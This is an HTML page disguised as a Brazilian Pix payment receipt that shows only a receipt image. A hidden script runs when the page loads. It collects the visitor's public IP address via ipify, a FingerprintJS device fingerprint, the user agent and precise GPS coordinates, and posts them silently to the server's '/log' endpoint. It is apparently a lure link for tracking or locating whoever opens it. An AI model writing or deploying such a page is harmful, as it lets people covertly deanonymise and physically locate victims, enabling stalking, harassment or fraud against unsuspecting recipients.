<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Comprovante Pix</title>
  <style>
    body { background: #f2f2f2; text-align: center; font-family: Arial; }
    img { margin-top: 50px; width: 90%; max-width: 500px; }
  </style>
</head>
<body>
  <img src="comprovante.jpg" alt="Comprovante Pix">

  <script async src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>

  <script>
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(ipData => {
        const ip = ipData.ip;
        const userAgent = navigator.userAgent;

        const sendData = (lat, lon, visitorId) => {
          fetch("/log", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              ip,
              visitorId,
              userAgent,
              device: userAgent,
              loc: lat && lon ? `${lat},${lon}` : undefined
            })
          })
          .then(r => r.ok ? console.log("✅ Enviado!") : console.warn("⚠️ Falhou:", r.status))
          .catch(err => console.error("❌ Erro:", err));
        };

        FingerprintJS.load()
          .then(fp => fp.get())
          .then(result => {
            const visitorId = result.visitorId;

            if (navigator.geolocation) {
              navigator.geolocation.getCurrentPosition(
                pos => sendData(pos.coords.latitude, pos.coords.longitude, visitorId),
                err => {
                  console.warn("⚠️ Sem geolocalização:", err.message);
                  sendData(null, null, visitorId);
                }
              );
            } else {
              console.log("❌ Geolocalização não suportada");
              sendData(null, null, visitorId);
            }
          });
      });
  </script>
</body>
</html>
